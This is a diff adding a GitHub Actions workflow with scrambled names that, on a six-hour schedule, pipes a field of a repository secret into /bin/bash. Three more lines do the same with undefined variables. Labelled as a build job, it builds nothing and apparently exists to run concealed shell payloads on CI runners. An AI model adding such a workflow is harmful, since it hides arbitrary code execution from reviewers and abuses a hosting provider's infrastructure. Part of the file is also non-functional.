@@ -1,0 +1,21 @@
+name: dengdaiwenqiy
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dengdaiwenqiy
+        env:
+          ugnyu74496: ${{ secrets.ugnyu74496 }}
+        run: |
+          echo $ugnyu74496 | jq -r .bzafw67857 | /bin/bash
+          echo $gywn49 | jq -r .vhgro29956 | /bin/bash
+          echo $qxor79837 | jq -r .ewav64 | /bin/bash
+          echo $q4 | jq -r .l4 | /bin/bash
+
